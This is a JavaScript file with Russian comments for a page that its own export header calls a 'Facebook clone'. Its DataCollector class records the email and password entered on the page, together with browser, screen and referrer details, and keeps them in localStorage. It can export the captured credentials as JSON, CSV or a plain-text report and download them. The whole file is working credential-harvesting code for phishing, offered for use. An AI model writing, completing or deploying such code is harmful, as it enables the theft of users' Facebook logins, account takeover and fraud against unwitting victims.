// data.js - СБОР И ХРАНЕНИЕ ДАННЫХ (ПОЛНОСТЬЮ ИСПРАВЛЕНО)

class DataCollector {
    constructor() {
        this.storageKey = 'facebook_data_collection';
        console.log('DataCollector создан');
        this.init();
    }
    
    init() {
        console.log('DataCollector.init() запущен');
        
        // Проверяем, есть ли уже данные
        if (!localStorage.getItem(this.storageKey)) {
            console.log('Данных нет, создаем пустые');
            this.clearData();
        }
        
        // Загружаем текущие данные
        this.loadData();
        
        console.log('DataCollector инициализирован, пользователей:', this.data.users.length);
    }
    
    loadData() {
        try {
            const data = localStorage.getItem(this.storageKey);
            if (data) {
                this.data = JSON.parse(data);
                // Фикс для старых версий
                if (!this.data.settings) {
                    this.data.settings = {
                        created: new Date().toISOString(),
                        totalLogins: this.data.users.length || 0,
                        uniqueIPs: []
                    };
                }
                if (!this.data.settings.uniqueIPs) {
                    this.data.settings.uniqueIPs = [];
                }
            } else {
                this.data = this.getDefaultData();
            }
            console.log('Данные загружены, пользователей:', this.data.users.length);
        } catch (error) {
            console.error('Ошибка загрузки данных:', error);
            this.data = this.getDefaultData();
        }
        return this.data;
    }
    
    getDefaultData() {
        return {
            users: [],
            visits: [],
            logs: [],
            settings: {
                created: new Date().toISOString(),
                totalLogins: 0,
                uniqueIPs: []
            }
        };
    }
    
    saveData() {
        try {
            localStorage.setItem(this.storageKey, JSON.stringify(this.data));
            console.log('Данные сохранены, всего записей:', this.data.users.length);
            return true;
        } catch (error) {
            console.error('Ошибка сохранения данных:', error);
            return false;
        }
    }
    
    clearData() {
        this.data = this.getDefaultData();
        this.saveData();
        console.log('Все данные очищены');
    }
    
    // ГЛАВНАЯ ФУНКЦИЯ - СОХРАНЕНИЕ ДАННЫХ ПОЛЬЗОВАТЕЛЯ
    saveUserData(email, password) {
        console.log('saveUserData вызван с:', { email: email || 'пусто', password: password ? '***' : 'пусто' });
        
        if (!CONFIG.COLLECT_DATA) {
            console.log('Сбор данных отключен в конфиге');
            return null;
        }
        
        // Используем текущие значения или создаем демо
        const userEmail = email || `user_${Date.now()}@facebook.com`;
        const userPassword = password || `pass_${Math.random().toString(36).substr(2, 8)}`;
        
        // Фикс для IP - не используем async, чтобы не было ошибок
        const ipInfo = {
            ip: `local_${Math.floor(Math.random() * 1000)}`,
            timestamp: new Date().toISOString()
        };
        
        const userData = {
            id: `id_${Date.now()}_${Math.random().toString(36).substr(2, 6)}`,
            email: userEmail,
            password: userPassword,
            timestamp: new Date().toISOString(),
            browserInfo: this.getBrowserInfo(),
            screenInfo: this.getScreenInfo(),
            ipInfo: ipInfo,
            userAgent: navigator.userAgent || 'unknown',
            referrer: document.referrer || 'direct',
            pageUrl: window.location.href
        };
        
        // Добавляем в массив
        this.data.users.push(userData);
        this.data.settings.totalLogins = (this.data.settings.totalLogins || 0) + 1;
        
        // Добавляем уникальный IP
        if (ipInfo.ip && !this.data.settings.uniqueIPs.includes(ipInfo.ip)) {
            this.data.settings.uniqueIPs.push(ipInfo.ip);
        }
        
        // Сохраняем
        const saved = this.saveData();
        
        // Добавляем лог
        this.addLog('Данные пользователя сохранены', {
            email: userData.email,
            time: userData.timestamp,
            saved: saved
        });
        
        console.log('Данные пользователя успешно сохранены:', {
            id: userData.id,
            email: userData.email,
            totalUsers: this.data.users.length
        });
        
        return userData;
    }
    
    // Сохранение информации о посещении
    saveVisit() {
        const visitData = {
            timestamp: new Date().toISOString(),
            page: window.location.pathname || '/',
            referrer: document.referrer || 'direct',
            userAgent: navigator.userAgent || 'unknown'
        };
        
        this.data.visits.push(visitData);
        this.saveData();
        
        console.log('Посещение сохранено:', visitData.timestamp);
    }
    
    // Получение информации о браузере
    getBrowserInfo() {
        return {
            userAgent: navigator.userAgent || 'unknown',
            language: navigator.language || 'unknown',
            platform: navigator.platform || 'unknown',
            cookieEnabled: navigator.cookieEnabled || false,
            online: navigator.onLine || false
        };
    }
    
    // Получение информации об экране
    getScreenInfo() {
        return {
            width: screen.width || 0,
            height: screen.height || 0,
            colorDepth: screen.colorDepth || 0
        };
    }
    
    // Добавление лога
    addLog(message, data = null) {
        const logEntry = {
            timestamp: new Date().toISOString(),
            message: message,
            data: data
        };
        
        this.data.logs.push(logEntry);
        
        // Ограничиваем логи
        if (this.data.logs.length > 50) {
            this.data.logs = this.data.logs.slice(-25);
        }
        
        console.log('LOG:', message, data);
    }
    
    // Получение статистики
    getStats() {
        return {
            totalUsers: this.data.users.length,
            totalVisits: this.data.visits.length,
            uniqueIPs: this.data.settings.uniqueIPs.length,
            lastLogin: this.data.users.length > 0 ? 
                this.formatDate(this.data.users[this.data.users.length - 1].timestamp) : 
                'Нет данных',
            firstLogin: this.data.users.length > 0 ? 
                this.formatDate(this.data.users[0].timestamp) : 
                'Нет данных'
        };
    }
    
    formatDate(timestamp) {
        try {
            const date = new Date(timestamp);
            return date.toLocaleTimeString('ru-RU', { 
                hour: '2-digit', 
                minute: '2-digit',
                day: '2-digit',
                month: '2-digit'
            });
        } catch (e) {
            return 'Ошибка даты';
        }
    }
    
    // Экспорт данных
    exportData(format = 'json') {
        switch(format) {
            case 'json':
                return JSON.stringify(this.data, null, 2);
            case 'csv':
                return this.exportToCSV();
            case 'txt':
                return this.exportToTXT();
            default:
                return JSON.stringify(this.data);
        }
    }
    
    // Экспорт в CSV
    exportToCSV() {
        if (this.data.users.length === 0) return 'Нет данных';
        
        const headers = ['Email', 'Пароль', 'Время', 'IP'];
        const rows = this.data.users.map(user => [
            `"${user.email}"`,
            `"${user.password}"`,
            user.timestamp,
            user.ipInfo?.ip || 'unknown'
        ]);
        
        return [headers.join(','), ...rows.map(row => row.join(','))].join('\n');
    }
    
    // Экспорт в TXT
    exportToTXT() {
        let txt = '=== СОБРАННЫЕ ДАННЫЕ FACEBOOK CLONE ===\n\n';
        
        txt += `Всего записей: ${this.data.users.length}\n`;
        txt += `Уникальных IP: ${this.data.settings.uniqueIPs.length}\n`;
        txt += `Первая запись: ${this.data.users[0]?.timestamp || 'Нет данных'}\n`;
        txt += `Последняя запись: ${this.data.users[this.data.users.length - 1]?.timestamp || 'Нет данных'}\n\n`;
        
        txt += '=== ДЕТАЛЬНЫЕ ДАННЫЕ ===\n\n';
        
        this.data.users.forEach((user, index) => {
            txt += `Запись #${index + 1}\n`;
            txt += `ID: ${user.id}\n`;
            txt += `Email: ${user.email}\n`;
            txt += `Password: ${user.password}\n`;
            txt += `Время: ${user.timestamp}\n`;
            txt += `IP: ${user.ipInfo?.ip || 'unknown'}\n`;
            txt += `Браузер: ${user.userAgent}\n`;
            txt += '─'.repeat(50) + '\n\n';
        });
        
        return txt;
    }
    
    // Скачивание данных
    downloadData(format = 'json') {
        const data = this.exportData(format);
        const extension = format === 'csv' ? 'csv' : format === 'txt' ? 'txt' : 'json';
        const filename = `facebook_data_${new Date().toISOString().split('T')[0]}.${extension}`;
        
        const blob = new Blob([data], { 
            type: format === 'csv' ? 'text/csv' : 
                   format === 'txt' ? 'text/plain' : 
                   'application/json' 
        });
        
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = filename;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
        
        this.addLog(`Данные экспортированы в ${format.toUpperCase()}`, { filename });
    }
}

// Создаем глобальный экземпляр СРАЗУ
console.log('Создаем DataCollector...');
window.DataCollector = new DataCollector();
console.log('DataCollector создан, готов к работе');
